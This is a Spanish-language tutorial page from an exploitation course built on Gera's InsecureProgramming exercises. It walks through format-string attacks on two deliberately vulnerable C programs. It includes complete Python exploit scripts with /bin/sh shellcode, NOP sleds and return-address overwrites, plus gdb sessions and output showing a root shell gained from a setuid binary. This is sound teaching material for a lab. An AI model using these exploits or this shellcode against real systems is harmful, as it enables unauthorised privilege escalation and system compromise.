<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead">Basada en Insecure programming de <a href="">Gera</a></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/">Home</a>-->

        <a class="sidebar-nav-item" href="/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/esoteric/index.html">Esoteric</a>

      <a class="sidebar-nav-item sidebar-sub-item" href="/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/esoteric/6-practica.html">Nivel 6 | Práctica</a>


      <a class="sidebar-nav-item" href="https://github.com/poole/hyde/archive/v2.1.0.zip">Descargar PDF</a>
      <a class="sidebar-nav-item" href="https://github.com/poole/hyde">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | Fundación Sadosky  </br> BY-NC-SA | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-format-string">Ataque Format String</h1>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="fs-1">Fs 1</h3>
<pre><code class="language-C">int main(int argv,char **argc) {
	short int zero=0;
	int *plen=(int*)malloc(sizeof(int));
	char buf[256];

	strcpy(buf,argc[1]);
	printf("%s%hn\n",buf,plen);
	while(zero);
}
</code></pre>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>El programa vulnerable copia en <code>buf</code> el primer parámetro ingresado por el usuario. Imprime por salida estándar el contenido de <code>buf</code> y guarda en <code>plen</code> la cantidad de bytes impresos. Si la variable <code>zero</code> se mantiene intacta el loop <code>while(zero)</code> no se ejecuta y el proceso finaliza.</p>

<pre><code class="language-bash">user@abos:~$ gcc -m32 -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o fs1 fs1.c
user@abos:~$ sudo chown root ./fs1; sudo chmod u+s ./fs1                      ; root owner &amp; setuid

user@abos:~$ ./fs1 AAAAA
AAAAA
user@abos:~$ ./fs1 BBBBBBB
BBBBBBB
</code></pre>

<h3 id="cuál-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<ul>
  <li>Si se sigue la estrategia de sobreescribir la dirección de retorno de <code>main</code>, de manera colateral se pisa el valor de <code>zero</code> provocando un loop infinito. Frente a esto el proceso nunca retorna y la reescritura de la dirección de retorno en la pila es inútil.</li>
</ul>

<p><img src="/format-string/imagenes/fs1/escritura-zero.png" alt="pila" /></p>

<ul>
  <li>Es necesario pensar en un ataque combinado de desbordamiento de búfer y el aprovechamiento de una vulnerabilidad del tipo format string.</li>
</ul>

<h3 id="layout-de-la-pila-antes-del-exploit">Layout de la pila antes del exploit:</h3>
<pre><code class="language-asm">[ebp-264]  = buf
[ebp-8]    = plen
[ebp-4]    = zero
[ebp]      = ebp anterior
[ebp+4]    = dirección de retorno
</code></pre>

<p><img src="/format-string/imagenes/fs1/layout-pila.png" alt="pila" /></p>

<h2 id="ataque-format-string-1">Ataque Format String:</h2>
<p>La reescritura de la dirección de retorno de <code>main</code> a través de un desbodamiento de búfer -en la función <code>strcpy</code>- obliga a sobreescribir la variable <code>zero</code> (por su ubicación en la pila entre <code>buf</code> y la dirección de retorno). Para que el ataque funcione es necesario que <code>main</code> retorne y por ende que <code>zero</code> continúe siendo 0.</p>

<p><img src="/format-string/imagenes/fs1/escritura-zero-2.png" alt="pila" /></p>

<blockquote>
  <p><strong>Consideraciones</strong>: no es plausible como solución sobreescribir <code>zero</code> con el valor numérico de <code>0000</code>. Como el desbordamiento de bufer se logra a través <code>strcpy</code>, una función que manipula strings, si optamos por escribir en <code>zero</code> el string “0000” estaríamos almacenando en <code>zero</code> el código ascii: <code>0x30303030</code>. Y por ende no lograríamos el objetivo de que el programa retorne.</p>
</blockquote>

<p>Para solucionar este escollo es necesario combinar el ataque de desbordamiento de búfer con un ataque del tipo format string.    <br />
Este ataque tomará dos pasos. Primero, aprovechar <code>strcpy(buf,argc[1])</code> para inyectar el shellcode y sobreescribir la dirección de retorno de <code>main()</code> almacenada en la pila para que apunte a él. Y en un segundo paso, aprovechamos <code>printf("%s%hn\n",buf,plen)</code> para volver a <code>zero = 0</code> de manera indirecta a través de <code>plen</code>, gracias a una vulnerabilidad del tipo format string. Paso a paso la estrategia será la siguiente:</p>

<p><strong>Primera parte</strong>: aprovechando el código <code>strcpy(buf,argc[1])</code>:</p>
<ul>
  <li>Inyectamos el shellcode en <code>buf</code>.</li>
  <li>Con un desbordamiento sobreescribimos <code>plen</code> para que apunte a <code>zero</code>.</li>
  <li>Y sobreescribimos la dirección de retorno de <code>main()</code> para que apunte a <code>buf</code>.</li>
</ul>

<p><strong>Segunda parte</strong>: aprovechando <code>printf("%s%hn\n",buf,plen)</code>:</p>
<ul>
  <li>Esta línea de código nos va a permitir escribir un valor arbitrario de no más de dos bytes en <code>plen</code>.   <br />
<a href="/format-string/5-format-string.html#parámetros-de-formato">Como se indicó previamente</a> el parámetro <code>%n</code> escribe la cantidad de bytes impresos en la dirección especificada. Cuando se lo utiliza como <code>%hn</code> como en este caso (con una <code>h</code> de <em>half</em> como formato adicional de longitud) va a escribir la cantidad de caracteres impresos pero en un short de 2 bytes.</li>
  <li>
    <p>Gracias al desbordamiento de búfer previo, <code>plen</code> apunta a <code>zero</code>. El primer <code>%s</code> del format string va a imprimir el string en <code>buf</code> hasta llegar a un caracter nulo, si logramos que la extensión de ese string sea de 10000 en hexa -como <code>%hn</code> escribe sólo dos bytes- logramos escribir <code>0000</code> en <code>plen</code> (quedando descartado el 1 inicial de (1)0000).    <br />
Entonces como <code>plen</code> apunta a <code>zero</code> si manipulamos adecuadamente la extensión de <code>buf</code> logramos el objetivo de que <code>zero = 0</code> indirectamente a través de <code>plen</code>.    <br />
Con ello evitamos el loop infinito del <code>while(zero)</code> y logramos que <code>main</code> retorne al código malicioso inyectado en el primer paso.</p>

    <p><img src="/format-string/imagenes/fs1/exploit.png" alt="pila" /></p>
  </li>
</ul>

<p>Para lograrlo llevamos a cabo los siguientes pasos.</p>

<ol>
  <li>
    <p>Identificamos la dirección de <code>buf</code> en <code>gdb</code></p>

    <blockquote>
      <p><strong>Consideraciones</strong>: como el argumento que le vamos a pasar a <code>strcpy</code> se almacena en la pila, su longitud afecta el cálculo de la dirección de <code>buf</code>. En este caso sabemos que la longitud total del argumento (es decir la cantidad de caracteres que va a imprimir <code>printf</code>) debe ser de <code>0x(1)0000</code> que en decimal es <code>65536</code>.    <br />
Por eso para conocer la dirección que tendrá <code>buf</code> debugeamos el programa con un argumento cualquiera pero de esa longitud.</p>
    </blockquote>

    <p>Armamos un archivo en Python para ingresar el input: <code>exploit.py</code></p>

    <pre><code class="language-python">#! /usr/bin/env python
   
import sys
   
exploit = "A" * 65536                   # 0x1000 == 65536
   
sys.stdout.write(exploit)
</code></pre>

    <p>Y ejecutamos el programa vulnerable con ese argumento para conocer la dirección de <code>buf</code>:</p>

    <pre><code class="language-bash">$ ../r.sh gdb ./fs1
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) break main
(gdb) r "$(./exploit.py)"
(gdb) break 6
(gdb) c
Continuing.
   
Breakpoint 2, main (argv=3, argc=0xbffff814) at fs1.c:6
6   strcpy(buf,argc[1]);
   
(gdb) x/wx buf
0xbffef680: 0x00000000
</code></pre>
    <p>La dirección de <code>buf</code> es entonces <code>0xbffef680</code>.</p>
  </li>
  <li>
    <p>Planificamos el argumento de entrada</p>
    <ul>
      <li>Inyectamos el shellcode en <code>buf</code>.</li>
      <li>Hacemos que <code>plen</code> apunte a <code>zero</code>.</li>
      <li>Escribimos basura en <code>zero</code> (porque vamos a pisar su valor).</li>
      <li>Incluimos una dirección válida cualquiera en <code>ebp</code>.</li>
      <li>Sobreescribimos la dirección de retorno para que apunte al shellcode.</li>
      <li>Extendemos longitud del input para imprimir un total de (1)0000 bytes, cantidad almacenada en <code>plen</code> (que apuntará a <code>zero</code>).</li>
    </ul>
  </li>
</ol>

<p><img src="/format-string/imagenes/fs1/exploit.png" alt="pila" /></p>

<ol>
  <li>
    <p>Con eso en mente editamos el archivo en Python con el argumento definitivo: <code>exploit.py</code></p>

    <pre><code class="language-python">#! /usr/bin/env python
   
import sys
from struct import pack
   
#pwn a shell
shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08"
shellcode += "\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\x31\xd2"
shellcode += "\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8"
shellcode += "\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += "\x41\x42\x42\x42\x42\x43\x43\x43\x43"
   
buf_size = 256
   
buf_addr  = 0xbffef680
zero_addr = buf_addr + buf_size + 4 + 2         #addr zero (4 bytes: int plen; 2 bytes: short int zero)
   
exploit  = "\x90" * 80                          #nop sled
exploit += shellcode                            #shellcode
exploit += "\x42" * (256-80-len(shellcode))     #fill buf
#total: 256 bytes
   
exploit += pack("&lt;I", zero_addr)                #plen -&gt; &amp;zero
exploit += "AAAA"                               #basura en zero
exploit += pack("&lt;I", buf_addr)                 #basura -addr existente- en ebp
exploit += pack("&lt;I", buf_addr)                 #ret addr -&gt; &amp;shellcode
#total: 16 bytes

exploit += "B" * (65536-256-16)                 #%hn contabiliza 0x10000 o 65536 bytes (*plen = 0000)

sys.stdout.write(exploit)
</code></pre>
  </li>
  <li>
    <p>Ejecutamos el exploit</p>
    <pre><code class="language-bash">user@abos:~$ ../r.sh ./fs1 "$(./exploit.py)"

BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user),27(sudo)
# 
</code></pre>
  </li>
</ol>

<h3 id="layout-de-la-pila-después-del-exploit">Layout de la pila después del exploit:</h3>
<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/format-string/imagenes/fs1/programa-explotado.png" alt="pila después" /></p>

<p>…………………………………………………………………………………………………………………………………………………</p>
<h2 id="fs2">FS2</h2>

<h3 id="código-fuente">Código fuente</h3>

<pre><code class="language-C">int main(int argv,char **argc) {
        char buf[256];

        snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1]);
        snprintf(buf,sizeof buf,"%s%c%c%hn",argc[2]);
}
</code></pre>

<h3 id="qué-hace-el-programa-1">¿Qué hace el programa?</h3>
<p>El programa vulnerable espera dos argumentos de entrada. Copia en <code>buf</code> el primer argumento ingresado por el usuario. El format string de <code>snprintf</code> indica que espera un puntero a un string, dos valores del tipo caracter y otro puntero a dónde se va a guardar la cantidad de bytes impresos (número almacenado en dos bytes). Se reiteran estos pasos con el segundo argumento ingresado.</p>

<h3 id="cuál-es-la-dificultad-principal-1">¿Cuál es la dificultad principal?</h3>
<ul>
  <li><code>snprintf(char *buf, size_t size, const char *format, ...)</code> almacena en la salida (es decir, en <code>buf</code>) sólo el tamaño indicado por <code>size</code>.</li>
  <li><code>%hn</code> como parámetro escribe la cantidad de bytes impresos únicamente en dos bytes. Mientras que la dirección que necesitamos sobreescribir tiene 4 bytes.</li>
</ul>

<h3 id="layout-de-la-pila-antes-del-exploit-1">Layout de la pila antes del exploit:</h3>
<p>Estado de la pila antes de ejecutar el primer <code>snprintf</code>:</p>

<pre><code class="language-C">      int main(int argv,char **argc) {
        char buf[256];

eip =&gt;  snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1]);
        snprintf(buf,sizeof buf,"%s%c%c%hn",argc[2]);
     }
</code></pre>

<p><img src="/format-string/imagenes/fs2/layout-pila.png" alt="pila-1" /></p>

<p>Con el primer <code>call</code> a <code>snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1])</code> se apilan sus parámetros de la siguiente manera:</p>

<p><img src="/format-string/imagenes/fs2/layout-pila-snprintf.png" alt="pila-2" /></p>

<p>El gráfico del estado de la pila al hacer el llamado a <code>snprintf</code> muestra cómo esa función de formato obtiene de la pila los parámetros de formato <code>"%s%c%c%hn"</code>. ese es el contenido que almacena en <code>buf</code>.</p>

<h3 id="ataque-format-string-2">Ataque Format String</h3>
<h4 id="particularidad-de-la-función-snprintf">Particularidad de la función <code>snprintf()</code>:</h4>
<p>La función <code>snprintf(char *buf, size_t size, const char *format, ...)</code> almacena en <code>buf</code> sólo el tamaño indicado por <code>size</code>. En este caso <code>snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1])</code> escribe en <code>buf</code> 256 bytes que es el tamaño de <code>buf</code> que se pasa como parámetro. Independientemente de eso, el parámetro de formato <code>%hn</code> escribe en una dirección dada <strong>la cantidad total de bytes impresos pudiendo ser mayor que el tamaño de <code>buf</code></strong>.    <br />
Por ejemplo, si tuviesemos una llamada <code>snprintf(buf, 256, "%s%n", &amp;txt, &amp;num_caracteres)</code> y sabemos que <code>len(txt)</code> es 1024. Aunque en buf se copien 256 bytes (el size que se le pasa por parámetro), en <code>num_caracteres</code> se va a escribir el número 1024, es decir el total de bytes impresos.   <br />
Esto permite aprovecharnos del format string para lograr una escritura arbitraria manipulando la cantidad total de caracteres impresos, sin importar la restricción del tamaño de <code>buf</code>.</p>

<p>Aprovechando esa peculiaridad vamos a sobreesribir la dirección de retorno de <code>main</code> almacenada en la pila para que apunte al shellcode.    <br />
Al igual que antes este ataque toma dos partes:</p>

<p><strong>Primera parte</strong>: con <code>snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1])</code> inyectamos el shellcode en <code>buf</code> y -manipulando el total de bytes impresos- aprovechamos el parámetro <code>%hn</code> para sobreescribir los dos primeros bytes de la dirección de retorno de <code>main</code> con parte de la dirección de <code>buf</code>.</p>

<p><strong>Segunda parte</strong>: con <code>snprintf(buf,sizeof buf,"%s%c%c%hn",argc[2])</code> aprovechando también <code>%hn</code> sobrescribimos los otros dos bytes de la dirección de retorno.</p>

<p>Para lograrlo llevamos a cabo los siguientes pasos.</p>

<ol>
  <li>Planificamos los argumentos de <code>main()</code>
    <ul>
      <li>Inyectamos el shellcode en <code>buf</code></li>
      <li>Usamos el parámetro <code>%hn</code> para sobreescribir en la dirección de retorno de <code>main</code></li>
      <li>Para ello extendemos la longitud del input para que la cantidad de caracteres impresos por <code>snprintf</code> sea igual a la dirección de <code>buf</code>.   <br />
Así logramos sobreescribir la dirección de retorno para que apunte a <code>buf</code>.</li>
    </ul>

    <p><img src="/format-string/imagenes/fs2/planificacion-format-string.png" alt="pila" /></p>

    <blockquote>
      <p><strong>Consideraciones</strong>:   <br />
    - Fallo en tobogán de NOPs: con esta estrategia el tobogán de NOPs que debe desembocar en el shellcode, se detiene erróneamente en la dirección de retorno apilada al comienzo de <code>buf</code> (en el gŕafico <code>&amp;ret_addr</code>). Esa dirección de retorno es importante ya que le indica al parámetro <code>%hn</code> dónde escribir.    <br />
      Es necesaria una modificación para que los primeros bytes de <code>buf</code> hagan un jump que se saltee esa dirección de retorno y siga por el tobogán de NOPs hasta el shellcode. Para eso se incluye al principio de <code>buf</code> el código <code>\xeb\x0a</code> que es el código máquina de la instrucción <code>jmp 0xc</code>. De manera que al retornar <code>main</code> se desemboca en <code>buf</code>, se hace un salto de 12 bytes y se cae en el tobogán de NOPs que finalmente desembocan en el shellcode.</p>
    </blockquote>

    <p>Entonces para incluir el jump que evite el fallo en el tobogán de NOPs, el layout de pila deseado es:</p>

    <p><img src="/format-string/imagenes/fs2/modificacion-exploit.png" alt="pila" /></p>
  </li>
  <li>
    <p>Identificamos la dirección de buf   <br />
Para averiguar la dirección de <code>buf</code> es necesario volver a tener en cuenta la cuestión del padding.
En casos como: <code>printf("%s",argc[1])</code> al string de entrada se lo pasamos como un argumento y por ende se almacena en la pila. Sumar un byte al final del string modifica los offsets en la pila y complejiza el cálculo de direcciones de memoria.</p>

    <p>Pasando siempre argumentos de igual longitud fijamos los offsets de la pila. Para eso llamamos al programa con un argumento extra que funciona como “padding” y es relativo a la longitud del resto de los argumentos. Así logramos consistencia en las direcciones de memoria sin importar que modifiquemos los bytes de longitud del/los string/s de entrada.   <br />
Creamos el archivo <code>exploit.py</code> para probar el padding:</p>
    <pre><code class="language-python">#! /usr/bin/env python
import sys

exploit= "BBBB"                   ; acá puede ir cualquier cosa
   
padding = "A" * (100000 - len(exploit))
   
if sys.argv[1] == "1":
  sys.stdout.write(exploit)
elif sys.argv[1] == "2":
  sys.stdout.write(padding)
</code></pre>
    <p>Y averiguamos la dirección de <code>buf</code> pasándole ambos argumentos:</p>
    <pre><code class="language-bash">user@abos:~$  ./r.sh gdb ./fs2 "$(./exploit.py 1)" "$(./exploit.py 2)"
(gdb) break main
(gdb) r "$(./exploit.py 1)" "$(./exploit.py 2)"
Breakpoint 1, main (argv=3, argc=0xbffe7154) at fs2.c:7
7         snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1]);
(gdb) x/wx buf
0xbffe6fb8: 0x00000001
</code></pre>

    <p>Como siempre vamos a usar el mismo padding, es decir los argumentos van a tener siempre la misma longitud aunque editemos el bytecode del exploit, podemos estar seguros de que la dirección de <code>buf</code> en el exploit definitivo va a ser también <code>0xbffe6fb8</code>.</p>
  </li>
  <li>
    <p>Editamos el archivo <code>exploit.py</code> para pasar ambos inputs.         <br />
Como dijimos nos cuidamos de incluir el jump para evitar que se interrumpa el tobogán de NOPs antes de llegar al shellcode.    <br />
Y recordemos que sólo podemos sobreescribir la dirección de retorno de a dos bytes. Es por ello que al incluirla en el exploit la desglosamos en los dos bytes menos significativos de esa dirección (<code>ret_addr_low</code>) y los dos bytes más significativos ( <code>ret_addr_high</code>). Lo mismo sucede con la dirección de <code>buf</code> que vamos a escribir allí, con el primer input escribirmos la parte menos significativa de esa dirección (<code>buf_addr_low</code>) y con el segundo input escribimos los dos bytes más significativos (<code>buf_addr_high</code>).</p>

    <pre><code class="language-python">#! /usr/bin/env python
   
"""Uso: ./fs2 "$(./exploit.py 1)" "$(./exploit.py 2)" "$(./exploit.py 3)" """

import sys
   
from struct import pack
   
shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
shellcode += "\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"
shellcode += "\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
   
buf_size = 256
   
buf_addr     = 0xbffe6fb8                              
   
buf_addr_low  = (buf_addr &gt;&gt;  0) &amp; 0x0000ffff
buf_addr_high = (buf_addr &gt;&gt; 16) &amp; 0x0000ffff
   
ret_addr_low  = buf_addr + buf_size + 4 + 0
ret_addr_high = buf_addr + buf_size + 4 + 2
   
   
exploit_argv1  = "\xeb\x0a" + "\x90" * 2              # \xeb\x0a == jmp 0xc
exploit_argv1 += "\x90" * 4
exploit_argv1 += pack("&lt;I", ret_addr_high)
exploit_argv1 += "\x90" * 40
exploit_argv1 += shellcode
exploit_argv1 += "A" * (buf_addr_high - len(exploit_argv1) - 2)
   
exploit_argv2  = "\xeb\x0a" + "\x90" * 2              # \xeb\x0a == jmp 0xc
exploit_argv2 += "\x90" * 4
exploit_argv2 += pack("&lt;I", ret_addr_low)
exploit_argv2 += "\x90" * 40
exploit_argv2 += shellcode
exploit_argv2 += "A" * (buf_addr_low - len(exploit_argv2) - 2)
   
padding = "A" * (100000 - len(exploit_argv1) - len(exploit_argv2) - 2)
   
   
if sys.argv[1] == "1":
        sys.stdout.write(exploit_argv1)
elif sys.argv[1] == "2":
        sys.stdout.write(exploit_argv2)
elif sys.argv[1] == "3":
        sys.stdout.write(padding)
</code></pre>
  </li>
  <li>Ejecutamos el exploit
    <pre><code class="language-bash">user@abos:~$ ./fs2 "$(./exploit.py 1)" "$(./exploit.py 2)" "$(./exploit.py 3)"
   
process 1537 is executing new program: /bin/dash
$ 
</code></pre>
  </li>
</ol>

<h3 id="layout-de-la-pila-después-del-exploit-1">Layout de la pila después del exploit:</h3>
<p>Gráficamente logramos el siguiente resultado:</p>

<p><img src="/format-string/imagenes/fs2/pila-exploit.png" alt="pila-3" /></p>

<h3 id="cómo-seguir">¿Cómo seguir?</h3>

<ol>
  <li><strong>Format String 3</strong>: lograr el ataque con una única escritura en <code>buf</code> de 2 bytes.</li>
</ol>

<h5 id="código-fuente-1">Código fuente</h5>
<pre><code class="language-C">int main(int argv,char **argc) {
        char buf[256];

        snprintf(buf,sizeof buf,"%s%c%c%hn",argc[1]);
}
</code></pre>


</div>

    </div>

  </body>
</html>
